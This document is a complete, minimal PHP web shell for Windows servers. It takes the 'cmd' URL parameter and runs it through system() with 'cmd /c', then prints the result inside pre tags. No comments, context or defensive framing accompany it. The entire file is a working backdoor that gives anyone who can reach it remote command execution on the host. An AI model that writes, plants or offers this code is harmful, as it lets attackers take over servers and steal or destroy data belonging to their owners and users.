<?php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system("cmd /c " . $_GET['cmd']);
    echo "</pre>";
}
?>